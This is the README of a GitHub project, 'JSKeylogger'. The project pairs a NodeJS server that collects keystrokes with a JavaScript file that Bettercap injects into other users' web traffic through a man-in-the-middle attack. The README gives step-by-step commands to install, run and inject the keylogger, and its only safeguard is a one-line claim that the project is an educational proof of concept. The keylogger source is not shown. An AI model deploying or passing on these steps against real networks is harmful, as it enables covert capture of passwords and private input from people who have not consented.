# JSKeylogger

Simple NodeJS reception server + injectable JavaScript code + Bettercap caplet.

## Setup

Clone the repository with

```bash
git clone https://github.com/deantonious/JSKeylogger.git
```

Install dependencies with

```bash
cd server
npm install
```

Run the server with

```bash
npm start
```

Host the inject.js file somewhere accessible and inject the file with 

```bash
cd ../caplet
bettercap -caplet injector.cap
```

## Disclaimer

This project is a PoC for testing and educational purposes.

## License

This software is licensed under the MIT License. See the [license file](LICENSE) for details.
